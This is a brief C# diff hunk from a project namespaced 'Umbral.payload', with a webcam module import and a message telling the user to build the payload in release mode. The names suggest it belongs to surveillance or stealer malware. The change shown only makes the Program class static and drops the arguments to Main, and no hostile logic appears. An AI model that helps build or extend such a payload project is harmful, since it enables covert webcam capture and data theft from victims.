@@ -17,9 +17,9 @@ using Umbral.payload.Webcam;
 
 namespace Umbral.payload
 {
-    internal class Program
+    internal static class Program
     {
-        static private async Task Main(string[] args)
+        static private async Task Main()
         {
 #if DEBUG
             MessageBox.Show("Build payload under RELEASE mode to work.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
